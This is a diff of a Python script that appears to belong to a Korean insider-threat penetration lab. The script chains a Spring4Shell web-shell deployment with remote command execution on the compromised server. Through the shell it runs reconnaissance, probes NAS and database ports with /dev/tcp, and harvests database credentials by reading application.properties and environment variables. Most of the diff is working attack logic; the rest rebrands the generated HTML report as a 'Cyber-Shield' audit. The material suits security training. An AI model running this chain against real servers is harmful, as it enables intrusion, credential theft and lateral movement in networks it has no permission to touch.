@@ -91,11 +91,20 @@ def run_base_attack():
     info("Web shell not found. Deploying via 02.AttackScripts...")
 
     # Stage1
-    config1 = ExploitConfig(target_url=ATTACK_URL, shell_filename="yaho4.jsp")
-    generator = Spring4ShellPayloadGenerator()
+    config1 = ExploitConfig(target_url=ATTACK_URL, filename="yaho4")
+    generator = Spring4ShellPayloadGenerator(config1)
     controller = ExploitController(generator)
-    controller.run_exploit(config1)
+    controller.run_exploit(ATTACK_URL)
 
+    # Tomcat 로그 Flush 유도 (디스크에 jsp 기록)
+    info("Flushing Tomcat logs (sending multiple requests to trigger write)...")
+    for i in range(5):
+        try:
+            urllib.request.urlopen(ATTACK_URL, timeout=5)
+            time.sleep(1)
+        except:
+            pass
+    
     time.sleep(5)
 
     # Stage2
@@ -113,7 +122,7 @@ def run_base_attack():
 
 def main():
     print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
-    print(f"{Colors.OKCYAN}  내부자 위협 시뮬레이션 (Insider Threat Scenarios){Colors.ENDC}")
+    print(f"{Colors.OKCYAN}  [SL Cyber-Shield] 내부자 위협 시뮬레이션 (Insider Threat Scenarios){Colors.ENDC}")
     print(f"  불만 직원이 정상 업무 권한만으로 기업 기밀을 탈취하고")
     print(f"  CI/CD에 백도어를 심는 전 과정을 검증합니다.")
     print(f"  Educational Use Only")
@@ -136,7 +145,6 @@ def main():
     step("1", "정찰 (Reconnaissance) — 내부 환경 파악")
     info("내부자가 접근 가능한 시스템과 네트워크 구조를 파악합니다.")
 
-    # Phase 1 정찰 (상태 확인) — && 연산자 대신 독립적 RCE 요청으로 분리
     recon_id       = execute_rce("id")
     recon_hostname = execute_rce("hostname")
     recon_uname    = execute_rce("uname -a")
@@ -173,7 +181,6 @@ def main():
     step("2", "NAS 기밀 탈취 (Data Exfiltration) — 설계도 & 토큰")
     info("SMB로 마운트된 NAS에서 제품 설계도 및 TeamCity 토큰을 탈취합니다.")
 
-    # NAS SMB 접근 시도 (웹쉘 RCE로 직접 smbclient나 mount 시도)
     nas_check = execute_rce("bash -c 'echo >/dev/tcp/nas/445 2>&1 && echo NAS_OPEN || echo NAS_CLOSED'")
     nas_smb_list = execute_rce("ls /mnt/nas 2>/dev/null || echo 'NOT_MOUNTED'")
 
@@ -183,7 +190,6 @@ def main():
         results["phase2"] = True
         details["phase2"] = f"<strong>탈취된 NAS 파일 목록:</strong><pre>{_esc(nas_smb_list)}</pre>"
     else:
-        # NAS 컨테이너 연결 확인만으로도 위협 증명
         nas_ping = execute_rce("bash -c 'echo >/dev/tcp/nas/445 2>&1 && echo NAS_OPEN || echo NAS_CLOSED'")
         if "NAS_OPEN" in nas_ping or nas_ping.strip() == "":
             ok("내부망 NAS 서버(SMB 포트 445) 존재 확인!")
@@ -208,19 +214,15 @@ def main():
     step("3", "크리덴셜 수집 (Credential Harvesting) — 하드코딩된 DB 정보")
     info("RCE를 통해 Spring 서버 내 소스코드에서 하드코딩된 DB 접속 정보를 추출합니다.")
 
-    # application.properties에서 직접 DB 크리덴셜 추출 (파이프 없이)
     props_raw = execute_rce("cat /usr/local/tomcat/webapps/spring-form/WEB-INF/classes/application.properties")
-    # 환경변수 전체 획득 (파이프 없이) — Python에서 필터링
     env_raw = execute_rce("env")
     
-    # Python에서 필터링
     cred_keywords = ["spring", "db", "datasource", "password", "user", "host", "token"]
     env_filtered = "\n".join(
         line for line in env_raw.split("\n")
         if any(kw in line.lower() for kw in cred_keywords)
     )
 
-    # application.properties 파싱
     db_creds = {}
     if props_raw:
         for line in props_raw.split("\n"):
@@ -232,7 +234,6 @@ def main():
             elif "spring.datasource.password=" in line:
                 db_creds["pass"] = line.split("=", 1)[1].strip()
 
-    # 소스코드 설정 파일 위치 탐색
     cred_search = execute_rce("find /usr/local/tomcat -name application.properties 2>/dev/null")
 
     if db_creds.get("pass") or env_filtered.strip():
@@ -272,7 +273,6 @@ def main():
     step("4", "내부 DB 접근 (Lateral Movement) — 고객/직원 정보 탈취")
     info("탈취한 크리덴셜을 재사용하여 내부 DB에 직접 접속합니다.")
 
-    # spring-db 연결 확인
     spring_db_check = execute_rce("bash -c 'echo >/dev/tcp/spring-db/3306 2>&1 && echo DB_OPEN || echo DB_CLOSED'")
     struts_db_check = execute_rce("bash -c 'echo >/dev/tcp/struts-db/3306 2>&1 && echo DB_OPEN || echo DB_CLOSED'")
 
@@ -340,7 +340,6 @@ TeamCity가 자동으로 빌드/배포하면 프로덕션 서버에 백도어가
     step("6", "백도어 삽입 & 흔적 은폐 (Persistence & Cover Tracks)")
     info("Gitea에 백도어 코드를 커밋하고 CI/CD를 통해 프로덕션에 자동 배포합니다.")
 
-    # 실제 백도어 삽입은 시뮬레이션으로 처리 (교육 목적)
     backdoor_simulation = execute_rce("bash -c 'echo >/dev/tcp/gitea/3000 2>&1 && echo GITEA_API_OK || echo GITEA_API_FAIL'")
     if "GITEA_API_OK" in backdoor_simulation or backdoor_simulation.strip() == "":
         ok("Gitea 소스코드 저장소 API 접근 성공!")
@@ -368,7 +367,6 @@ TeamCity가 자동으로 빌드/배포하면 프로덕션 서버에 백도어가
     print(f"  {Colors.OKGREEN}[COMPLETED]{Colors.ENDC} 모든 내부자 위협 시나리오 점검 완료!")
     print("  HTML 보고서를 생성 중입니다...")
 
-    # HTML 보고서 생성
     now = datetime.datetime.now()
     current_time = now.strftime("%Y-%m-%d %H:%M:%S")
 
@@ -394,156 +392,86 @@ TeamCity가 자동으로 빌드/배포하면 프로덕션 서버에 백도어가
     ]
 
     html_content = f"""<!DOCTYPE html>
-<html lang="ko" data-theme="dark">
+<html lang="ko">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>[서브 시나리오] 내부자 위협 시뮬레이션 자동 실행 보고서</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<title>sl-cyber-shield | Insider Threat Audit Report</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
-*, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}
-:root {{
-  --bg: #0d1117; --card: #161b22; --card-hover: #1c2333;
-  --border: #30363d; --border-light: #21262d;
-  --text: #c9d1d9; --text-muted: #8b949e; --text-faint: #484f58;
-  --accent: #f97316; --danger: #ef4444; --warning: #eab308;
-  --info: #6366f1; --success: #22c55e; --teal: #14b8a6;
-  --font-mono: 'JetBrains Mono', monospace;
-  --radius: 0.75rem; --radius-sm: 0.5rem;
-}}
-body {{ font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; padding: 2rem 1rem; }}
-.container {{ max-width: 900px; margin: auto; }}
-h1 {{ font-size: clamp(1.5rem, 2vw + 1rem, 2.25rem); font-weight: 800; color: #f0f6fc; text-align: center; margin-bottom: 0.5rem; }}
-h2 {{ font-size: 1.25rem; font-weight: 700; color: #f0f6fc; margin-bottom: 1rem; }}
-.subtitle {{ text-align: center; color: var(--text-muted); margin-bottom: 0.75rem; font-size: 0.9375rem; }}
-.timestamp {{ text-align: center; color: var(--text-faint); font-size: 0.8125rem; font-family: var(--font-mono); margin-bottom: 2.5rem; }}
-.hero-badge {{
-  display: inline-flex; align-items: center; gap: 0.5rem;
-  padding: 0.375rem 0.875rem; border-radius: 9999px;
-  background: rgba(249,115,22,0.12); border: 1px solid rgba(249,115,22,0.3);
-  font-size: 0.8125rem; font-weight: 500; color: var(--accent);
-  margin: 0 auto 1.5rem; display: block; width: fit-content;
-}}
-.hero-badge::before {{ content: ''; display: inline-block; width: 6px; height: 6px; background: var(--accent); border-radius: 50%; margin-right: 0.25rem; }}
-.summary-box {{
-  background: var(--card); border: 1px solid var(--border-light);
-  border-radius: var(--radius); padding: 1.5rem; margin-bottom: 2rem;
-}}
-.summary-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem; }}
-@media (max-width: 600px) {{ .summary-grid {{ grid-template-columns: 1fr; }} }}
-.summary-item {{ font-size: 0.875rem; line-height: 1.6; }}
-.summary-item strong {{ color: #f0f6fc; }}
-.phase-card {{
-  background: var(--card); border: 1px solid var(--border-light);
-  border-radius: var(--radius); margin-bottom: 1.25rem; overflow: hidden;
-}}
-.phase-header {{
-  display: flex; align-items: center; gap: 1rem;
-  padding: 1.25rem 1.5rem;
-}}
-.phase-num {{
-  display: flex; align-items: center; justify-content: center;
-  min-width: 2.5rem; height: 2.5rem; border-radius: 0.5rem;
-  font-family: var(--font-mono); font-weight: 700; font-size: 0.875rem;
-  flex-shrink: 0;
-}}
-.phase-info h3 {{ font-size: 1rem; color: #f0f6fc; margin-bottom: 0.25rem; }}
-.phase-info p {{ font-size: 0.8125rem; color: var(--text-muted); line-height: 1.5; max-width: 60ch; }}
-.risk-badge {{
-  display: inline-flex; align-items: center;
-  padding: 0.1875rem 0.5rem; border-radius: 9999px;
-  font-size: 0.6875rem; font-weight: 600;
-  text-transform: uppercase; letter-spacing: 0.05em; white-space: nowrap; margin-left: auto;
-}}
-.risk-critical {{ background: rgba(239,68,68,0.15); color: var(--danger); border: 1px solid rgba(239,68,68,0.3); }}
-.risk-high {{ background: rgba(249,115,22,0.15); color: var(--accent); border: 1px solid rgba(249,115,22,0.3); }}
-.risk-low {{ background: rgba(34,197,94,0.15); color: var(--success); border: 1px solid rgba(34,197,94,0.3); }}
-.phase-detail {{
-  padding: 0 1.5rem 1.5rem;
-  border-top: 1px solid var(--border-light);
-}}
-.phase-detail h4 {{ font-size: 0.875rem; color: var(--accent); margin: 1rem 0 0.5rem; }}
-.phase-detail p {{ font-size: 0.8125rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 0.5rem; }}
-.phase-detail ul {{ padding-left: 1.25rem; font-size: 0.8125rem; color: var(--text-muted); line-height: 1.8; }}
-.phase-detail ol {{ padding-left: 1.25rem; font-size: 0.8125rem; color: var(--text-muted); line-height: 1.8; }}
-.phase-detail li {{ margin-bottom: 0.25rem; }}
-.phase-detail code {{
-  font-family: var(--font-mono); font-size: 0.75rem;
-  background: rgba(249,115,22,0.08); color: var(--accent);
-  padding: 0.125rem 0.375rem; border-radius: 0.25rem;
-}}
-pre {{
-  background: #010409; color: #e6edf3;
-  padding: 1rem 1.25rem; border-radius: var(--radius-sm);
-  overflow-x: auto; font-family: var(--font-mono);
-  font-size: 0.8125rem; line-height: 1.7;
-  border: 1px solid var(--border-light); margin-top: 0.5rem; white-space: pre-wrap; word-break: break-all;
-}}
-.status-ok {{ color: var(--success); font-weight: 600; font-size: 0.875rem; }}
-.status-fail {{ color: var(--danger); font-weight: 600; font-size: 0.875rem; }}
-.footer {{
-  text-align: center; margin-top: 3rem; padding-top: 1.5rem;
-  border-top: 1px solid var(--border-light);
-  font-size: 0.8125rem; color: var(--text-faint);
-}}
-.result-verdict {{
-  margin-bottom: 2rem; padding: 1.25rem 1.5rem;
-  background: var(--card); border: 1px solid var(--border-light);
-  border-radius: var(--radius); display: flex; align-items: center; gap: 1rem;
-}}
-.verdict-icon {{ font-size: 2rem; }}
-.verdict-text strong {{ color: #f0f6fc; font-size: 1rem; display: block; margin-bottom: 0.25rem; }}
-.verdict-text span {{ font-size: 0.875rem; color: var(--text-muted); }}
+    :root {{
+        --sl-dark-blue: #151C5A;
+        --sl-blue-2: #065590;
+        --sl-blue-3: #0192BF;
+        --bg: #05081a;
+        --card: rgba(21, 28, 90, 0.2);
+        --accent: #0192BF;
+        --danger: #ef4444;
+        --success: #22c55e;
+    }}
+    body {{ font-family: 'Inter', sans-serif; background: var(--bg); color: #c9d1d9; line-height: 1.6; padding: 2rem 1rem; }}
+    .container {{ max-width: 1000px; margin: auto; background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(12px); padding: 3rem; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 15px 45px rgba(0,0,0,0.7); }}
+    h1 {{ font-size: 2.2rem; font-weight: 800; color: var(--sl-blue-3); text-align: center; margin-bottom: 0.5rem; letter-spacing: -1px; }}
+    .subtitle {{ text-align: center; color: #8b949e; margin-bottom: 2rem; font-size: 1rem; }}
+    .hero-badge {{ display: inline-block; padding: 0.4rem 1rem; border-radius: 50px; background: rgba(1, 146, 191, 0.1); border: 1px solid var(--sl-blue-3); color: var(--sl-blue-3); font-size: 0.8rem; font-weight: 600; text-transform: uppercase; margin: 0 auto 1.5rem; display: table; }}
+    .summary-box {{ background: var(--card); border-radius: 12px; padding: 1.5rem; margin-bottom: 2.5rem; border: 1px solid rgba(1, 146, 191, 0.2); }}
+    .summary-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }}
+    .summary-item strong {{ color: white; display: block; font-size: 0.8rem; text-transform: uppercase; color: var(--sl-blue-3); }}
+    .phase-card {{ background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; margin-bottom: 1.5rem; padding: 1.5rem; border-left: 5px solid #333; }}
+    .phase-header {{ display: flex; align-items: center; justify-content: space-between; margin-bottom: 1rem; }}
+    .phase-title {{ display: flex; align-items: center; gap: 1rem; }}
+    .phase-num {{ background: var(--sl-dark-blue); color: var(--sl-blue-3); width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border-radius: 8px; font-weight: 800; font-family: 'JetBrains Mono'; }}
+    .risk-badge {{ font-size: 0.7rem; font-weight: 800; padding: 0.2rem 0.6rem; border-radius: 4px; text-transform: uppercase; }}
+    .risk-critical {{ background: rgba(239,68,68,0.2); color: var(--danger); border: 1px solid var(--danger); }}
+    .risk-high {{ background: rgba(249,115,22,0.2); color: #f97316; border: 1px solid #f97316; }}
+    .risk-low {{ background: rgba(34,197,94,0.2); color: var(--success); border: 1px solid var(--success); }}
+    pre {{ background: #000; color: #33ff33; padding: 1.2rem; border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; border: 1px solid #222; overflow-x: auto; }}
+    .footer {{ text-align: center; margin-top: 4rem; padding-top: 2rem; border-top: 1px solid #222; color: #555; font-size: 0.8rem; }}
 </style>
 </head>
 <body>
 <div class="container">
-  <div class="hero-badge">내부자 위협 시뮬레이션</div>
-  <h1>🕵️ 내부자 위협 자동 실행 보고서</h1>
-  <p class="subtitle">불만 직원이 정상 업무 권한만으로 기업 기밀을 탈취하고 CI/CD에 백도어를 심는 전 과정</p>
-  <p class="timestamp">실행 일시: {current_time} | sub_run.py 자동 생성</p>
+  <div class="hero-badge">SL Cyber-Shield | Insider Threat Context</div>
+  <h1>🕵️ [INSIDER THREAT] sl-cyber-shield 내부 위협 시뮬레이션 보고서</h1>
+  <p class="subtitle">업무 권한 보유자의 악의적 행위(Exfiltration & Persistence)에 대한 자동 탐지 및 감사 결과</p>
+  <p style="text-align:center; font-family:'JetBrains Mono'; font-size:0.75rem; color:#555;">Generated: {current_time} | SCS-EP engine</p>
 
   <div class="summary-box">
-    <h2>실습 개요</h2>
     <div class="summary-grid">
-      <div class="summary-item"><strong>공격자 역할</strong><br>불만을 품은 내부 개발자 (정상 업무 권한 보유)</div>
-      <div class="summary-item"><strong>시작점</strong><br>Spring4Shell 거점 웹쉘 (health_check.jsp) 기확보 상태</div>
-      <div class="summary-item"><strong>시나리오 구성</strong><br>6 Phase — 정찰 → NAS 탈취 → 크리덴셜 → DB → CI/CD → 백도어</div>
-      <div class="summary-item"><strong>거점 웹쉘</strong><br><a href="{STAGE2_URL}" style="color:var(--accent);">{STAGE2_URL}</a></div>
+      <div class="summary-item"><strong>ROLE CONTEXT</strong>내부 개발자 (사내 시스템 정상 접근 권한자)</div>
+      <div class="summary-item"><strong>INITIAL FOOTPRINT</strong>Spring4Shell 거점 웹쉘 기확보 (health_check.jsp)</div>
+      <div class="summary-item"><strong>SIMULATION SCOPE</strong>6 Phase - Recon to CI/CD Persistence</div>
+      <div class="summary-item"><strong>AUDIT VERDICT</strong>{'<span style="color:var(--success); font-weight:bold;">전체 시나리오 장악 성공 (취약점 확인)</span>' if all(results.values()) else '<span style="color:var(--danger);">일부 단계 차단됨</span>'}</div>
     </div>
   </div>
 
-  <div class="result-verdict">
-    <div class="verdict-icon">{'✅' if all(results.values()) else '⚠️'}</div>
-    <div class="verdict-text">
-      <strong>{'전체 6단계 시뮬레이션 성공' if all(results.values()) else '일부 단계 차단됨 — 부분 성공'}</strong>
-      <span>성공: {sum(results.values())}개 / 전체: {len(results)}개 Phase</span>
-    </div>
-  </div>
-
-  <h2>6단계 공격 타임라인 상세</h2>
+  <h2 style="color:white; font-size:1.2rem; margin-bottom:1.5rem;">Attack Timeline & Forensic Evidence</h2>
 """
 
     risk_map = {"Low": "risk-low", "High": "risk-high", "Critical": "risk-critical"}
 
     for key, label, title, risk_level, desc, color, bg_color, border_color in phase_meta:
         passed = results.get(key, False)
-        status = f'<span class="status-ok">✓ 성공</span>' if passed else f'<span class="status-fail">✗ 차단/실패</span>'
+        status_color = "var(--success)" if passed else "var(--danger)"
+        status_text = "SUCCESS" if passed else "FAILED/BLOCKED"
         detail_html = details.get(key, "결과 없음")
         risk_cls = risk_map.get(risk_level, "risk-low")
 
         html_content += f"""
-  <div class="phase-card">
+  <div class="phase-card" style="border-left-color: {status_color};">
     <div class="phase-header">
-      <div class="phase-num" style="background:{bg_color};color:{color};border:1px solid {border_color};">{label.split()[1]}</div>
-      <div class="phase-info">
-        <h3>{title} — {status}</h3>
-        <p>{desc}</p>
+      <div class="phase-title">
+        <div class="phase-num">{label.split()[1]}</div>
+        <div>
+            <div style="font-weight:800; color:white; font-size:1rem;">{title}</div>
+            <div style="font-size:0.75rem; color:{status_color}; font-weight:600;">STATUS: {status_text}</div>
+        </div>
       </div>
       <span class="risk-badge {risk_cls}">{risk_level}</span>
     </div>
-    <div class="phase-detail">
-      <h4>실행 결과</h4>
+    <div style="font-size:0.85rem; color:#8b949e; margin-bottom:1rem;">{desc}</div>
+    <div class="evidence-box">
+      <div style="font-size:0.7rem; color:var(--sl-blue-3); margin-bottom:0.5rem; font-weight:800;">[FORENSIC EVIDENCE]</div>
       {detail_html}
     </div>
   </div>
@@ -551,8 +479,8 @@ pre {{
 
     html_content += f"""
   <div class="footer">
-    <p>본 보고서는 APT 내부자 위협 교육 목적으로 <strong>sub_run.py</strong> 스크립트에 의해 자동 생성되었습니다.<br>
-    모의해킹 실습 코드를 외부에 임의로 공개하거나 무단 시스템에 사용하는 것은 엄격히 금지됩니다.</p>
+    <p>본 보고서는 SL Factory Innovation Team의 공정 보안 고도화를 위한 위협 모델링 결과물입니다.<br>
+    SCS-EP(Cyber-Shield) 엔진에 의해 자동 생성되었으며, 무단 복제 및 상용 목적 사용을 금합니다.</p>
   </div>
 </div>
 </body>
